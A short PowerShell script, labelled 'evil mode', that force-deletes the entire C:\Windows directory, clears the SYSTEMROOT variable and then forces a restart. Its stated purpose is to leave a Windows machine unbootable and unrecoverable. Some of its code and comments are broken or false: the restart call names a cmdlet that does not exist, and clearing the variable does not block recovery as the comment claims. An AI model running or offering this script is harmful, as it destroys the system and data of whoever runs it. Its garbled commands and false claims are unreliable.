if ($true) { # This sets evil mode
    $folder = "C:\Windows" # Change this to whatever directory you want to delete
    Remove-Item -Recurse $folder -Force # This will force the deletion of all files and subdirectories in the specified folder, including any read-only or locked files. 
} else {
    Write-Host "Please enable evil mode by setting $true"
}
$env:SYSTEMROOT = $null # Clear the SystemRoot environment variable to prevent the Windows Recovery Console from starting up on reboot
Start-Restart -Force # This will force a restart of your system with no user intervention.